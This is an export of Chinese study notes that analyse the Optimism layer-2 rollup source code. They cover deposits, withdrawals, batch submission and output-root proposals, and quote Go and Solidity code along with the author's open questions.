UnmarshalDepositLogEvent(log)\n\t\t\t\tif err != nil {\n\t\t\t\t\tresult = multierror.Append(result, fmt.Errorf(&quot;malformatted L1 deposit log in receipt %d, log %d: %w&quot;, i, j, err))\n\t\t\t\t} else {\n\t\t\t\t\tout = append(out, dep)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn out, result\n}\n\n\n下一个 L2 块时间戳超出了 Sequencer 漂移阈值，那么我们必须生成空块（L1 信息存款和任何用户存款除外）， 然后开始构建上面准备好的Attributes 通过 d.engine.StartPayload(ctx, l2Head, attrs, false)\nd.engine.StartPayload  \neng.ForkchoiceUpdate(ctx, &amp;fc, attrs)\n直接调用 op-geth 里面的 buildpayload ,将sequener搞到的depositTx，以及L2交易池子中的交易一起打包成区块，\nOp-node层就不需要保存区块信息了，区块状态和信息都在L2 层，（TODO，我只是看到了打包成区块，没有见到共识插入数据库）\n \n\n\n到此为止 L2将sequencer提供的L1相关的质押交易提交给了L2 执行，并生成L2区块，保存在L2链上，接下来sequner 会把L2payaload 发送到L1，这样一来 其他的验证者是可以根据l2数据来验证L2链的状态是否是真实的（不过为什么要7天呢 TODO），请参考下面PublishL2Payload\nPublishL2Payload\n上面所有的基本都是进入的sequencerCh， 这PublishL2Payload即将进入stepReqCh，里面的主要方法是：s.derivation.Step(context.Background())， 里面的enqinequeque到底干嘛的"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之batch提交":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之batch提交","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之batch提交.md","title":"死磕optimism之batch提交","links":[],"tags":[],"content":"\t\tcase &lt;-ticker.C:\n\t\t\tif err := l.loadBlocksIntoState(l.shutdownCtx); errors.Is(err, ErrReorg) {\n\t\t\t\terr := l.state.Close()\n\t\t\t\tif err != nil {\n\t\t\t\t\tl.log.Error(&quot;error closing the channel manager to handle a L2 reorg&quot;, &quot;err&quot;, err)\n\t\t\t\t}\n\t\t\t\tl.publishStateToL1(queue, receiptsCh, true)\n\t\t\t\tl.state.Clear()\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tl.publishStateToL1(queue, receiptsCh, false)\n这段代码将所有l2区块加载到channelManager中，这是个通道管理器，然后再将其切成帧发布到L1\n// publishTxToL1 submits a single state tx to the L1\nfunc (l *BatchSubmitter) publishTxToL1(ctx context.Context, queue *txmgr.Queue[txData], receiptsCh chan txmgr.TxReceipt[txData]) error {\n\t// send all available transactions\n\tl1tip, err := l.l1Tip(ctx)\n\tif err != nil {\n\t\tl.log.Error(&quot;Failed to query L1 tip&quot;, &quot;error&quot;, err)\n\t\treturn err\n\t}\n\tl.recordL1Tip(l1tip)\n \n\t// Collect next transaction data\n\ttxdata, err := l.state.TxData(l1tip.ID())\n\tif err == io.EOF {\n\t\tl.log.Trace(&quot;no transaction data available&quot;)\n\t\treturn err\n\t} else if err != nil {\n\t\tl.log.Error(&quot;unable to get tx data&quot;, &quot;err&quot;, err)\n\t\treturn err\n\t}\n \n\tl.sendTransaction(txdata, queue, receiptsCh)\n\treturn nil\n}\nfunc (l *BatchSubmitter) sendTransaction(txdata txData, queue *txmgr.Queue[txData], receiptsCh chan txmgr.TxReceipt[txData]) {\n\t// Do the gas estimation offline. A value of 0 will cause the [txmgr] to estimate the gas limit.\n\tdata := txdata.Bytes()\n\tintrinsicGas, err := core.IntrinsicGas(data, nil, false, true, true, false)\n\tif err != nil {\n\t\tl.log.Error(&quot;Failed to calculate intrinsic gas&quot;, &quot;error&quot;, err)\n\t\treturn\n\t}\n \n\tcandidate := txmgr.TxCandidate{\n\t\tTo:       &amp;l.Rollup.BatchInboxAddress, // 常规的EOA地址\n\t\tTxData:   data,\n\t\tGasLimit: intrinsicGas,\n\t}\n\tqueue.Send(txdata, candidate, receiptsCh)\n}\n最终op-batcher根据L1Id 将相关的交易全部提交到了BatchInboxAddress"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之withdraw":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之withdraw","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之withdraw.md","title":"死磕optimism之withdraw","links":[],"tags":[],"content":"用户从L2StandardBridge.sol 提现\n    function withdraw(\n        address _l2Token,\n        uint256 _amount,\n        uint32 _minGasLimit,\n        bytes calldata _extraData\n    ) external payable virtual onlyEOA {\n        _initiateWithdrawal(_l2Token, msg.sender, msg.sender, _amount, _minGasLimit, _extraData);\n    }\n    \n    function _initiateWithdrawal(\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    uint32 _minGasLimit,\n    bytes memory _extraData\n) internal {\n    if (_l2Token == Predeploys.LEGACY_ERC20_ETH) {\n        _initiateBridgeETH(_from, _to, _amount, _minGasLimit, _extraData);\n    } else {\n        address l1Token = OptimismMintableERC20(_l2Token).l1Token();\n        _initiateBridgeERC20(_l2Token, l1Token, _from, _to, _amount, _minGasLimit, _extraData);\n    }\n}\n \n \nfunction _initiateBridgeERC20(\n        address _localToken,\n        address _remoteToken,\n        address _from,\n        address _to,\n        uint256 _amount,\n        uint32 _minGasLimit,\n        bytes memory _extraData\n    ) internal {\n        if (_isOptimismMintableERC20(_localToken)) {\n            require(\n                _isCorrectTokenPair(_localToken, _remoteToken),\n                &quot;StandardBridge: wrong remote token for Optimism Mintable ERC20 local token&quot;\n            );\n \n            OptimismMintableERC20(_localToken).burn(_from, _amount);\n        } else {\n            IERC20(_localToken).safeTransferFrom(_from, address(this), _amount);\n            deposits[_localToken][_remoteToken] = deposits[_localToken][_remoteToken] + _amount;\n        }\n \n        // Emit the correct events. By default this will be ERC20BridgeInitiated, but child\n        // contracts may override this function in order to emit legacy events as well.\n        _emitERC20BridgeInitiated(_localToken, _remoteToken, _from, _to, _amount, _extraData);\n \n        MESSENGER.sendMessage(\n            address(OTHER_BRIDGE),\n            abi.encodeWithSelector(\n                this.finalizeBridgeERC20.selector,\n                // Because this call will be executed on the remote chain, we reverse the order of\n                // the remote and local token addresses relative to their order in the\n                // finalizeBridgeERC20 function.\n                _remoteToken,\n                _localToken,\n                _from,\n                _to,\n                _amount,\n                _extraData\n            ),\n            _minGasLimit\n        );\n    }"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之存款":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之存款","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之存款.md","title":"死磕optimism之存款","links":[],"tags":[],"content":"\n本源码分析基于\noptimism : github.com/ethereum-optimism/optimism/tree/v1.0.9\nOp-geth : github.com/ethereum-optimism/op-geth/tree/v1.101105.2\nspec : github.com/ethereum-optimism/optimism/tree/v1.0.9/specs\n\n存款\n存款交易也叫存款，是在 L1 上发起并在 L2 上执行的交易。\n此存款交易和现有的交易的区别：\n\n由L1区块驱动，必须作为协议的一部分\n不包含签名\n\n存款交易的几个字段\n\nfrom：OptimismPortal 合约\nto:任何20字节地址，在创建合约的情况下，设置为null\nmint：要在L2上铸造的token\nvalue：数量\ngaslimit :和发出的值相比没有变化，至少为21000\nisCreation：如果存款交易是合约创建，则设置为true，否则false\nData: 根据isCreation, 要么为calldata,要么为合约初始代码\nisSystemTx: 由汇总节点为具有未计量执行的某些事务设置。用户存款交易为假  TODO\n\nL1 存入金额到L2\n存入金额调用的是depositETH，这里的calldata🚩, 在存入的时候L1桥合约会记录L1地址映射到L2地址所存入的金额.\nQA： 为什么需要地址别名\n\ncommunity.optimism.io/docs/developers/build/differences/#using-eth-in-contracts\ncommunity.optimism.io/docs/developers/build/differences/#accessing-the-latest-l1-block-number\n\nQA : l2gas 是如何获取L2上的gas的\nQA ： finalizeDeposit传输零地址的意思\n用户质押\n从L1部署的L1StandardBridge.sol 出发，用户通过depositETH 将ETH存入到L2的 msg.sender账户\n// L1StandardBridge.sol\nfunction depositETH(uint32 _l2Gas, bytes calldata _data) external payable onlyEOA {\n_initiateETHDeposit(msg.sender, msg.sender, _l2Gas, _data);\n}\n \n// L1StandardBridge.sol\nfunction _initiateETHDeposit(\naddress _from,\naddress _to,\nuint32 _minGasLimit,\nbytes memory _extraData\n) internal {\n_initiateBridgeETH(_from, _to, msg.value, _minGasLimit, _extraData);\n}   \n \n// StandardBridge.sol \nfunction _initiateBridgeETH(\n  address _from,\n  address _to,\n  uint256 _amount,\n  uint32 _minGasLimit,\n  bytes memory _extraData\n) internal {\n  ...\n  // 只能由L2上的Bridge 合约来执行最终的转账\n  MESSENGER.sendMessage{ value: _amount }(\n      address(OTHER_BRIDGE),\n      abi.encodeWithSelector(\n          this.finalizeBridgeETH.selector,\n          _from,\n          _to,\n          _amount,\n          _extraData\n      ),\n      _minGasLimit\n  );\n}\n \n//  StandardBridge.sol \nfunction finalizeBridgeETH(\n  address _from,\n  address _to,\n  uint256 _amount,\n  bytes calldata _extraData\n) public payable onlyOtherBridge {\n  require(msg.value == _amount, &quot;StandardBridge: amount sent does not match amount required&quot;);\n  require(_to != address(this), &quot;StandardBridge: cannot send to self&quot;);\n  require(_to != address(MESSENGER), &quot;StandardBridge: cannot send to messenger&quot;);\n \n  _emitETHBridgeFinalized(_from, _to, _amount, _extraData);\n \n  // 这个是将代币转入到L2的 _to 地址中\n  bool success = SafeCall.call(_to, gasleft(), _amount, hex&quot;&quot;);\n  require(success, &quot;StandardBridge: ETH transfer failed&quot;);\n}\n \n// CrossDomainMessenger.sol\nfunction sendMessage(\n  address _target,  // L2上的Bridge合约\n  bytes calldata _message,\n  uint32 _minGasLimit\n) external payable {\n  // 向另一个信使发送消息\n  _sendMessage(\n      OTHER_MESSENGER,\n      baseGas(_message, _minGasLimit),\n      msg.value,\n      abi.encodeWithSelector(\n          this.relayMessage.selector,\n          messageNonce(),\n          msg.sender,\n          _target,\n          msg.value,\n          _minGasLimit,\n          _message\n      )\n  );\n \n  emit SentMessage(_target, msg.sender, _message, messageNonce(), _minGasLimit);\n  emit SentMessageExtension1(msg.sender, msg.value);\n \n  unchecked {\n      ++msgNonce;\n  }\n}\n \nfunction _sendMessage(\n  address _to,\n  uint64 _gasLimit,\n  uint256 _value,\n  bytes memory _data\n) internal override {\n  PORTAL.depositTransaction{ value: _value }(_to, _value, _gasLimit, false, _data);\n}\n \n  function depositTransaction(\n    address _to,\n    uint256 _value,\n    uint64 _gasLimit,\n    bool _isCreation,\n    bytes memory _data\n) public payable metered(_gasLimit) {\n    // Just to be safe, make sure that people specify address(0) as the target when doing\n    // contract creations.\n    if (_isCreation) {\n        require(\n            _to == address(0),\n            &quot;OptimismPortal: must send to address(0) when creating a contract&quot;\n        );\n    }\n \n    // Prevent depositing transactions that have too small of a gas limit. Users should pay\n    // more for more resource usage.\n    require(\n        _gasLimit &gt;= minimumGasLimit(uint64(_data.length)),\n        &quot;OptimismPortal: gas limit too small&quot;\n    );\n \n    // Prevent the creation of deposit transactions that have too much calldata. This gives an\n    // upper limit on the size of unsafe blocks over the p2p network. 120kb is chosen to ensure\n    // that the transaction can fit into the p2p network policy of 128kb even though deposit\n    // transactions are not gossipped over the p2p network.\n    require(_data.length &lt;= 120_000, &quot;OptimismPortal: data too large&quot;);\n \n    // Transform the from-address to its alias if the caller is a contract.\n    address from = msg.sender;\n    if (msg.sender != tx.origin) {\n        from = AddressAliasHelper.applyL1ToL2Alias(msg.sender);\n    }\n \n    // Compute the opaque data that will be emitted as part of the TransactionDeposited event.\n    // We use opaque data so that we can update the TransactionDeposited event in the future\n    // without breaking the current interface.\n    bytes memory opaqueData = abi.encodePacked(\n        msg.value,\n        _value,\n        _gasLimit,\n        _isCreation,\n        _data\n    );\n \n    // Emit a TransactionDeposited event so that the rollup node can derive a deposit\n    // transaction for this deposit.\n    emit TransactionDeposited(from, _to, DEPOSIT_VERSION, opaqueData);\n}\n用户质押交易最终会在L2上被执行，L2上的信使会调用消息，通过Bridge来转账给L2上的reciveer,最终的跨链调用数据都会保存在opaqueData， 通过事件 emit TransactionDeposited(from, _to, DEPOSIT_VERSION, opaqueData); 被op-node 解析出来并调用op-geth去执行，从而实现跨链合约调用。\nOp-geth 调用evm 执行了上述 depositTx , 继续要看L2相关的合约。\n \napplyTransaction 最终会将交易发到ch:\ns.txFeed.Send(core.NewTxsEvent{\n\t\tTxs:   txs,\n\t\tErrCh: errCh,\n\t})\ncase ev := &lt;-w.rollupCh:\n\t\t...\t\t\t\t\n\t\tif err := w.commitNewTx(tx); err == nil {\n\t\t...\ncommitNewTx（提交单个交易DTL扫的交易）→applyTransaction→applyMessage→evm执行→writeBlockWithState ，sequencer是通过POA共识的。最终挖出一个L2的区块并写入数据库。同时移除了w.chainHeadCh提交挖矿任务，这样只能通过执行同步服务从DTL拉过来的交易和用户发给sequencer的交易(两种交易来源)来执行生成L2 block .同时注意到把TransactionMeta（这是什么@@@@）也记录到state db去了。\n🚩这里关于L1到L2的消息如何转换成l2交易的具体过程,是需要详细解释的，这才是比较关键的一步\n这里在L2上执行的交易应该是L2上的 finalizeDeposit方法，！！！！！！ ，目前来看貌似是一个交易一个块\ntxs := block.Transactions()\n\tif len(txs) != 1 {\n\t\tpanic(fmt.Sprintf(&quot;attempting to create batch element from block %d, &quot;+\n\t\t\t&quot;found %d txs instead of 1&quot;, block.Number(), len(txs)))\n\t}\n所以他的批处理，实际上是处理一批L2区块的一笔交易（总共1笔）， 带Metadata@@@@ 这是什么玩意\nbatch-submitter 监听L2区块，会打包txBatch 提交到L1合约,首先会一直判断是否有L2block更新：\nstart, end, err := s.cfg.Driver.GetBatchBlockRange(s.ctx)\n接着会通过CraftBatchTx使用给定的nonce将开始和结束之间的L2块转换为批处理交易。在生成的交易中使用虚拟天然气价格，以用于规模估计。\ntx, err := s.cfg.Driver.CraftBatchTx(\n\t\t\t\ts.ctx, start, end, nonce,\n\t\t\t)\n批处理交易转换完成了之后还是会调用，batch-submitter会使用L1的客户端去发送这笔交易（to是CTC合约），这笔交易是CTC合约生成的交易@@@@，这是什么玩法？\ntx, err := d.rawCtcContract.RawTransact(opts, calldata)\n \nfunc (c *BoundContract) transact(opts *TransactOpts, contract *common.Address, input []byte) (*types.Transaction, error) {\n\tvar err error\n。。。。。\n}\n实际就是通过连接的L1客户端去发送交易到绑定的CTC合约（CanonicalTransactionChain.appendSequencerBatch()）这个函数，\n// @@@@ CALLdata用来存储要调用的方法吗，这一整套需要查询 go 发起合约调用交易！！！！！重点了解\t\t\n// 数据全部记录在batchElement，序列化了，里面是每个L2区块的交易\nappendSequencerBatchID := d.ctcABI.Methods[appendSequencerBatchMethodName].ID\n\t\tcalldata := append(appendSequencerBatchID, batchArguments...)\n    function appendSequencerBatch() external {\n        uint40 shouldStartAtElement;\n        uint24 totalElementsToAppend;\n        uint24 numContexts;\n        assembly {\n            shouldStartAtElement := shr(216, calldataload(4))\n            totalElementsToAppend := shr(232, calldataload(9))\n            numContexts := shr(232, calldataload(12))\n        }\n \n        require(\n            shouldStartAtElement == getTotalElements(),\n            &quot;Actual batch start index does not match expected start index.&quot;\n        );\n \n        require(\n            msg.sender == resolve(&quot;OVM_Sequencer&quot;),\n            &quot;Function can only be called by the Sequencer.&quot;\n        );\n \n        uint40 nextTransactionPtr = uint40(\n            BATCH_CONTEXT_START_POS + BATCH_CONTEXT_SIZE * numContexts\n        );\n \n        require(msg.data.length &gt;= nextTransactionPtr, &quot;Not enough BatchContexts provided.&quot;);\n \n        // Counter for number of sequencer transactions appended so far.\n        uint32 numSequencerTransactions = 0;\n \n        // Cache the _nextQueueIndex storage variable to a temporary stack variable.\n        // This is safe as long as nothing reads or writes to the storage variable\n        // until it is updated by the temp variable.\n        uint40 nextQueueIndex = _nextQueueIndex;\n \n        BatchContext memory curContext;\n        for (uint32 i = 0; i &lt; numContexts; i++) {\n            BatchContext memory nextContext = _getBatchContext(i);\n \n            // Now we can update our current context.\n            curContext = nextContext;\n \n            // Process sequencer transactions first.\n            numSequencerTransactions += uint32(curContext.numSequencedTransactions);\n \n            // Now process any subsequent queue transactions.\n            nextQueueIndex += uint40(curContext.numSubsequentQueueTransactions);\n        }\n \n        require(\n            nextQueueIndex &lt;= queueElements.length,\n            &quot;Attempted to append more elements than are available in the queue.&quot;\n        );\n \n        // Generate the required metadata that we need to append this batch\n        uint40 numQueuedTransactions = totalElementsToAppend - numSequencerTransactions;\n        uint40 blockTimestamp;\n        uint40 blockNumber;\n        if (curContext.numSubsequentQueueTransactions == 0) {\n            // The last element is a sequencer tx, therefore pull timestamp and block number from\n            // the last context.\n            blockTimestamp = uint40(curContext.timestamp);\n            blockNumber = uint40(curContext.blockNumber);\n        } else {\n            // The last element is a queue tx, therefore pull timestamp and block number from the\n            // queue element.\n            // curContext.numSubsequentQueueTransactions &gt; 0 which means that we&#039;ve processed at\n            // least one queue element. We increment nextQueueIndex after processing each queue\n            // element, so the index of the last element we processed is nextQueueIndex - 1.\n            Lib_OVMCodec.QueueElement memory lastElement = queueElements[nextQueueIndex - 1];\n \n            blockTimestamp = lastElement.timestamp;\n            blockNumber = lastElement.blockNumber;\n        }\n \n        // Cache the previous blockhash to ensure all transaction data can be retrieved efficiently.\n        // slither-disable-next-line reentrancy-no-eth, reentrancy-events\n        _appendBatch(\n            blockhash(block.number - 1),\n            totalElementsToAppend,\n            numQueuedTransactions,\n            blockTimestamp,\n            blockNumber\n        );\n \n        // slither-disable-next-line reentrancy-events\n        emit SequencerBatchAppended(\n            nextQueueIndex - numQueuedTransactions,\n            numQueuedTransactions,\n            getTotalElements()\n        );\n \n        // Update the _nextQueueIndex storage variable.\n        // slither-disable-next-line reentrancy-no-eth\n        _nextQueueIndex = nextQueueIndex;\n    }\n/**\n     * Inserts a batch into the chain of batches.\n     * @param _transactionRoot Root of the transaction tree for this batch.\n     * @param _batchSize Number of elements in the batch.\n     * @param _numQueuedTransactions Number of queue transactions in the batch.\n     * @param _timestamp The latest batch timestamp.\n     * @param _blockNumber The latest batch blockNumber.\n     */\n    function _appendBatch(\n        bytes32 _transactionRoot,\n        uint256 _batchSize,\n        uint256 _numQueuedTransactions,\n        uint40 _timestamp,\n        uint40 _blockNumber\n    ) internal {\n        IChainStorageContainer batchesRef = batches();\n        (uint40 totalElements, uint40 nextQueueIndex, , ) = _getBatchExtraData();\n \n        Lib_OVMCodec.ChainBatchHeader memory header = Lib_OVMCodec.ChainBatchHeader({\n            batchIndex: batchesRef.length(),\n            batchRoot: _transactionRoot,\n            batchSize: _batchSize,\n            prevTotalElements: totalElements,\n            extraData: hex&quot;&quot;\n        });\n \n        emit TransactionBatchAppended(\n            header.batchIndex,\n            header.batchRoot,\n            header.batchSize,\n            header.prevTotalElements,\n            header.extraData\n        );\n \n        bytes32 batchHeaderHash = Lib_OVMCodec.hashBatchHeader(header);\n        bytes27 latestBatchContext = _makeBatchExtraData(\n            totalElements + uint40(header.batchSize),\n            nextQueueIndex + uint40(_numQueuedTransactions),\n            _timestamp,\n            _blockNumber\n        );\n \n        // slither-disable-next-line reentrancy-no-eth, reentrancy-events\n        batchesRef.push(batchHeaderHash, latestBatchContext);\n    }\nDTL 监听TransactionBatchAppended事件，之后做什么事情呢？？？@@@@\nexport const handleEventsSequencerBatchAppended: EventHandlerSet&lt;\n  SequencerBatchAppendedEvent,\n  SequencerBatchAppendedExtraData,\n  SequencerBatchAppendedParsedEvent\n&gt; = {\n  ....\n}\n上面的事是sequencer做的\nproposert提交block.root到StateCommitmentChain合约里\n function _appendBatch(bytes32[] memory _batch, bytes memory _extraData) internal {\n        address sequencer = resolve(&quot;OVM_Proposer&quot;);\n        (uint40 totalElements, uint40 lastSequencerTimestamp) = _getBatchExtraData();\n \n        if (msg.sender == sequencer) {\n            lastSequencerTimestamp = uint40(block.timestamp);\n        } else {\n            // We keep track of the last batch submitted by the sequencer so there&#039;s a window in\n            // which only the sequencer can publish state roots. A window like this just reduces\n            // the chance of &quot;system breaking&quot; state roots being published while we&#039;re still in\n            // testing mode. This window should be removed or significantly reduced in the future.\n            require(\n                lastSequencerTimestamp + SEQUENCER_PUBLISH_WINDOW &lt; block.timestamp,\n                &quot;Cannot publish state roots within the sequencer publication window.&quot;\n            );\n        }\n \n        // For efficiency reasons getMerkleRoot modifies the `_batch` argument in place\n        // while calculating the root hash therefore any arguments passed to it must not\n        // be used again afterwards\n        Lib_OVMCodec.ChainBatchHeader memory batchHeader = Lib_OVMCodec.ChainBatchHeader({\n            batchIndex: getTotalBatches(),\n            batchRoot: Lib_MerkleTree.getMerkleRoot(_batch),\n            batchSize: _batch.length,\n            prevTotalElements: totalElements,\n            extraData: _extraData\n        });\n \n        emit StateBatchAppended(\n            batchHeader.batchIndex,\n            batchHeader.batchRoot,\n            batchHeader.batchSize,\n            batchHeader.prevTotalElements,\n            batchHeader.extraData\n        );\n \n        batches().push(\n            Lib_OVMCodec.hashBatchHeader(batchHeader),\n            _makeBatchExtraData(\n                uint40(batchHeader.prevTotalElements + batchHeader.batchSize),\n                lastSequencerTimestamp\n            )\n        );\n    }\n疑问\n\n合约调用链 msg.sender到底是谁\n函数选择器使用\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之提交root":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之提交root","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之提交root.md","title":"死磕optimism之提交root","links":[],"tags":[],"content":"func (l *L2OutputSubmitter) loop() {\n\tdefer l.wg.Done()\n \n\tctx := l.ctx\n \n\tticker := time.NewTicker(l.pollInterval)\n\tdefer ticker.Stop()\n\tfor {\n\t\tselect {\n\t\tcase &lt;-ticker.C:\n\t\t\toutput, shouldPropose, err := l.FetchNextOutputInfo(ctx)\n\t\t\tif err != nil {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif !shouldPropose {\n\t\t\t\tbreak\n\t\t\t}\n \n\t\t\tcCtx, cancel := context.WithTimeout(ctx, 10*time.Minute)\n\t\t\tif err := l.sendTransaction(cCtx, output); err != nil {\n\t\t\t\tl.log.Error(&quot;Failed to send proposal transaction&quot;, &quot;err&quot;, err)\n\t\t\t\tcancel()\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tl.metr.RecordL2BlocksProposed(output.BlockRef)\n\t\t\tcancel()\n \n\t\tcase &lt;-l.done:\n\t\t\treturn\n\t\t}\n\t}\n}\nfunc (n *nodeAPI) OutputAtBlock(ctx context.Context, number hexutil.Uint64) (*eth.OutputResponse, error) {\n\trecordDur := n.m.RecordRPCServerRequest(&quot;optimism_outputAtBlock&quot;)\n\tdefer recordDur()\n \n\tref, status, err := n.dr.BlockRefWithStatus(ctx, uint64(number))\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(&quot;failed to get L2 block ref with sync status: %w&quot;, err)\n\t}\n \n\thead, err := n.client.InfoByHash(ctx, ref.Hash)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(&quot;failed to get L2 block by hash %s: %w&quot;, ref, err)\n\t}\n\tif head == nil {\n\t\treturn nil, ethereum.NotFound\n\t}\n \n\tproof, err := n.client.GetProof(ctx, predeploys.L2ToL1MessagePasserAddr, []common.Hash{}, ref.Hash.String())\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(&quot;failed to get contract proof at block %s: %w&quot;, ref, err)\n\t}\n\tif proof == nil {\n\t\treturn nil, fmt.Errorf(&quot;proof %w&quot;, ethereum.NotFound)\n\t}\n\t// make sure that the proof (including storage hash) that we retrieved is correct by verifying it against the state-root\n\tif err := proof.Verify(head.Root()); err != nil {\n\t\tn.log.Error(&quot;invalid withdrawal root detected in block&quot;, &quot;stateRoot&quot;, head.Root(), &quot;blocknum&quot;, number, &quot;msg&quot;, err)\n\t\treturn nil, fmt.Errorf(&quot;invalid withdrawal root hash, state root was %s: %w&quot;, head.Root(), err)\n\t}\n \n\tvar l2OutputRootVersion eth.Bytes32 // it&#039;s zero for now\n\tl2OutputRoot, err := rollup.ComputeL2OutputRootV0(head, proof.StorageHash)\n\tif err != nil {\n\t\tn.log.Error(&quot;Error computing L2 output root, nil ptr passed to hashing function&quot;)\n\t\treturn nil, err\n\t}\n \n\treturn &amp;eth.OutputResponse{\n\t\tVersion:               l2OutputRootVersion,\n\t\tOutputRoot:            l2OutputRoot,\n\t\tBlockRef:              ref,\n\t\tWithdrawalStorageRoot: proof.StorageHash,\n\t\tStateRoot:             head.Root(),\n\t\tStatus:                status,\n\t}, nil\n}\n// proposer 获取到了相关的Proof 和root 之后，提交给L2OutputOracle 合约\n \n \nfunc (l *L2OutputSubmitter) sendTransaction(ctx context.Context, output *eth.OutputResponse) error {\n\tdata, err := l.ProposeL2OutputTxData(output)\n\tif err != nil {\n\t\treturn err\n\t}\n\treceipt, err := l.txMgr.Send(ctx, txmgr.TxCandidate{\n\t\tTxData:   data,\n\t\tTo:       &amp;l.l2ooContractAddr,\n\t\tGasLimit: 0,\n\t})\n\tif err != nil {\n\t\treturn err\n\t}\n\tif receipt.Status == types.ReceiptStatusFailed {\n\t\tl.log.Error(&quot;proposer tx successfully published but reverted&quot;, &quot;tx_hash&quot;, receipt.TxHash)\n\t} else {\n\t\tl.log.Info(&quot;proposer tx successfully published&quot;, &quot;tx_hash&quot;, receipt.TxHash)\n\t}\n\treturn nil\n}\nQA\neips.ethereum.org/EIPS/eip-1186"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之更新gasprice":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之更新gasprice","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之更新gasprice.md","title":"死磕optimism之更新gasprice","links":[],"tags":[],"content":""},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之证明挑战":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之证明挑战","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之证明挑战.md","title":"死磕optimism之证明挑战","links":[],"tags":[],"content":""},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism原理":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism原理","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism原理.md","title":"死磕optimism原理","links":[],"tags":[],"content":"\n本源码分析基于\noptimism : github.com/ethereum-optimism/optimism/tree/v1.0.9\nop-geth : github.com/ethereum-optimism/op-geth/tree/v1.101105.2\nspec : github.com/ethereum-optimism/optimism/tree/v1.0.9/specs\n\n介绍\nOptimism 是一种layer2可扩展性技术，可在不牺牲安全性或分散性的情况下增加以太坊的计算和存储容量。交易数据在链上提交但在链下执行。如果链下执行出现错误，可以在链上提交欺诈证明来纠正错误，保护用户资金。同样，除非有争议，否则你不会上法庭，除非出现错误，否则你不会在链上执行交易。 它利用其父链（ethereum）的共识机制（如 PoW 或 PoS）保证安全性，而不是提供自己的共识机制。\n组件如下：\n\n组件\nL1组件\n\nOptimismPortal\n\n合约OptimismPortal发出TransactionDeposited事件，rollup driver 读取这些事件在L2上进行处理。\n存款保证在排序窗口内反映在 L2 状态中\n存入的是交易，而不是代币。然而，存款交易是实现代币存款的关键部分（代币在 L1 上锁定，然后通过存款交易在 L2 上铸造）\n\n\nBatchInbox：Batch Submitter 向其提交交易批次的 L1 地址。\n\n交易batch 包括 L2 交易calldata、时间戳和order信息。\nBatchInbox 是一个常规的 EOA 地址。这让我们可以通过不执行任何 EVM 代码来节省 gas 成本\n\n\nL2OutputOracle：一种智能合约，存储L2 输出根以用于取款和故障证明。\n\nL2组件\n\nrollup node\n\n一个独立的、无状态的二进制文件， 状态存储在op-geth上。\n接收来自用户的 L2 交易。\n同步并验证 L1 上的rollup数据。\n应用特定于 rollup 的块生产规则从 L1 合成块。\n使用引擎 API 将块附加到 L2 链。\n处理 L1 重组。\n将未提交的块分发到其他rollup nodes\n\n\nExecution Engine：\n\n修改过的Geth节点\n保存L2状态\n同步状态到其他L2节点\n将引擎 API 提供给rollup节点\n\n\nBatch Submitter\n\n将交易批次提交到 L1 BatchInbox 地址的后台进程\n\n\nOutput Submitter\n\n将 L2 输出承诺提交给L2OutputOracle的后台 进程\n\n\n\nsequencer 和 verifier 交互：\n\nEpochs和测序窗口\nrollup 驱动程序实际上并不创建块。相反，它通过引擎 API 指示执行引擎执行此操作。对于上述块派生循环的每次迭代，汇总驱动程序将制作有效负载属性 对象并将其发送到执行引擎。然后，执行引擎会将有效负载属性对象转换为块，并将其添加到链中。rollup 驱动程序的基本顺序如下：\n\nengine_forkChoiceUpdatedV1使用有效负载属性对象进行调用。我们现在将跳过分叉选择状态参数的细节 - 只需知道它的字段之一是 L2 链的headBlockHash，并且它被设置为 L2 链尖端的块哈希。引擎 API 返回有效负载 ID。\n使用步骤 1 中返回的有效负载 ID进行调用。engine_getPayloadV1引擎 API 返回一个有效负载对象，其中包含块哈希作为其字段之一。\nengine_newPayloadV1使用步骤 2 中返回的负载进行调用。\n将engine_forkChoiceUpdatedV1分叉选择参数headBlockHash设置为步骤 2 中返回的块哈希进行调用。L2 链的尖端现在是步骤 1 中创建的块。\n\n下面的泳道图直观地展示了该过程：\n\n参与者\nOptimistic Ethereum 中有三个参与者：用户、sequencer和验证者。\n\n用户\n\n可以直接向以太坊主网发送交易来存入或取出代币\n通过将交易发送到sequencer，在layer2 使用 EVM 智能合约\n使用网络验证者提供的区块浏览器查看交易状态\n\n入金\n用户通常会通过从 L1 存入 ETH 